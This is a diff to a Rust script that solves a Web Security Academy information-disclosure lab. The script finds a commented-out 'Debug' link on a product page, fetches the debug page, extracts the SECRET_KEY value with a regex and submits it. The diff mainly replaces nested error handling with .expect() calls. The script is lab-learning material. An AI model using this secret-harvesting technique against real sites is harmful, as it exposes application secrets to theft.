@@ -9,7 +9,7 @@
 * Steps: 1. Check the source code of a product page
 *        2. GET the href of the commented a tag named "Debug"
 *        3. Extract the secret key
-*        4. submit solution
+*        4. submit the solution
 *
 *****************************************************************/
 #![allow(unused)]
@@ -30,90 +30,82 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0ae700fb032623468425487000c70042.web-security-academy.net";
+    let url = "https://0a1200d103534f548174d50c002c0076.web-security-academy.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
     println!(
         "{} {}",
-        "1. Checking the source code..".white(),
+        "⦗1⦘ Checking the source code..".white(),
         "OK".green()
     );
 
-    // check the source code of a product page
-    let product_req = client.get(format!("{url}/product?productId=4")).send();
+    // fetch a product page
+    let product = client
+        .get(format!("{url}/product?productId=4"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to fetch a product page".red()));
 
-    // if response is OK
-    if let Ok(res) = product_req {
-        // get the body of the response
-        let body = res.text().unwrap();
+    // get the body of the response
+    let mut body = product.text().unwrap();
 
-        // extract the debug path; change this if it is changed in your case
-        let debug_path = capture_pattern("href=(.*)>Debug", &body);
+    // extract the debug path; change this if it is changed in your case
+    let debug_path = capture_pattern("href=(.*)>Debug", &body)
+        .expect(&format!("{}", "[!] Failed to extract the debug path".red()));
 
-        // if the href is found
-        if let Some(text) = debug_path {
-            println!(
-                "{} {} => {}",
-                "2. Extracting the debug path..".white(),
-                "OK".green(),
-                text.yellow()
-            );
+    println!(
+        "{} {} => {}",
+        "⦗2⦘ Extracting the debug path..".white(),
+        "OK".green(),
+        debug_path.yellow()
+    );
 
-            // fetch the debug page
-            let debug_page = client.get(format!("{url}{text}")).send();
+    // fetch the debug page
+    let debug_page = client
+        .get(format!("{url}{debug_path}"))
+        .send()
+        .expect(&format!("{}", "[!] Failed to fetch the debug page".red()));
 
-            // if fetching is OK
-            if let Ok(res) = debug_page {
-                println!(
-                    "{} {}",
-                    "3. Fetching the debug page..".white(),
-                    "OK".green()
-                );
+    println!(
+        "{} {}",
+        "⦗3⦘ Fetching the debug page..".white(),
+        "OK".green()
+    );
 
-                // get the body of the debug page
-                let body = res.text().unwrap();
+    // get the body of the debug page
+    body = debug_page.text().unwrap();
 
-                // extract the secret key
-                let secret_pattern = capture_pattern("SECRET_KEY.*class=\"v\">(.*) <", &body);
+    // extract the secret key
+    let secret_key = capture_pattern("SECRET_KEY.*class=\"v\">(.*) <", &body)
+        .expect(&format!("{}", "[!] Failed to extract the secret key".red()));
 
-                // if the key is found
-                if let Some(text) = secret_pattern {
-                    println!(
-                        "{} {} => {}",
-                        "4. Extracting the secret key..".white(),
-                        "OK".green(),
-                        text.yellow()
-                    );
+    println!(
+        "{} {} => {}",
+        "⦗4⦘ Extracting the secret key..".white(),
+        "OK".green(),
+        secret_key.yellow()
+    );
 
-                    // submit solution
-                    let submit_answer = client
-                        .post(format!("{url}/submitSolution"))
-                        .form(&HashMap::from([("answer", text)]))
-                        .send();
+    // submit the solution
+    client
+        .post(format!("{url}/submitSolution"))
+        .form(&HashMap::from([("answer", secret_key)]))
+        .send()
+        .expect(&format!("{}", "[!] Failed to submit the solution".red()));
 
-                    // if sumbitting is successful
-                    if let Ok(res) = submit_answer {
-                        println!("{} {}", "5. Submitting solution..".white(), "OK".green());
-                        println!(
-                            "{} {}",
-                            "🗹 Check your browser, it should be marked now as"
-                                .white()
-                                .bold(),
-                            "solved".green().bold()
-                        )
-                    } else {
-                        println!("{}", "[!] Failed to submit solution".red())
-                    }
-                } else {
-                    println!("{}", "[!] No secret key was found".red())
-                }
-            }
-        } else {
-            println!("{}", "[!] No debug path names was found".red())
-        }
-    }
+    println!(
+        "{} {}",
+        "⦗5⦘ Submitting the solution..".white(),
+        "OK".green()
+    );
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
 }
 
 /*******************************************************************
